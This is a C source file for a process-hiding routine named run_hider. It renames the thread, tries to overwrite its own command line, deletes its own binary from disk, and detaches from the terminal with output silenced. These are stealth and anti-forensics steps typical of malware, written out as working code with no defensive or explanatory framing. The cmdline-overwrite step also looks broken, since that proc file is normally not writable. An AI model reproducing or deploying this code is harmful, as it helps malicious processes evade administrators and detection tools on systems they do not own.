#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <errno.h>

/**
 * Steps:
 * 1. prctl(PR_SET_NAME) -> thread name
 * 2. Overwrite /proc/self/cmdline
 * 3. Unlink binary
 * 4. Detach from terminal (setsid)
 * 5. Close stdin/stdout/stderr
 */

int set_comm(const char *new_name) {
    if (!new_name) return -1;
    if (prctl(PR_SET_NAME, (unsigned long)new_name, 0, 0, 0) != 0) {
        perror("prctl failed");
        return -1;
    }
    return 0;
}

int overwrite_cmdline(const char *new_name) {
    if (!new_name) return -1;

    int fd = open("/proc/self/cmdline", O_WRONLY | O_TRUNC);
    if (fd < 0) {
        perror("open /proc/self/cmdline failed");
        return -1;
    }

    size_t len = strlen(new_name);
    if (write(fd, new_name, len) != (ssize_t)len) {
        close(fd);
        perror("write cmdline failed");
        return -1;
    }

    write(fd, "\0", 1); // NUL terminate
    close(fd);
    return 0;
}

int unlink_self() {
    char path[512];
    ssize_t n = readlink("/proc/self/exe", path, sizeof(path)-1);
    if (n <= 0) return -1;

    path[n] = '\0';
    if (unlink(path) != 0) {
        perror("unlink self failed");
        return -1;
    }
    return 0;
}

void detach_terminal() {
    if (setsid() < 0) {
        perror("setsid failed");
    }

    // Redirect stdio to /dev/null
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > 2) close(fd);
    }
}

int run_hider(const char *new_name) {
    int err = 0;

    // Step 1: change thread name
    if (set_comm(new_name) != 0) err = -1;

    // Step 2: overwrite /proc/self/cmdline
    if (overwrite_cmdline(new_name) != 0) err = -1;

    // Step 3: unlink binary
    if (unlink_self() != 0) err = -1;

    // Step 4: detach from terminal
    detach_terminal();

    return err;
}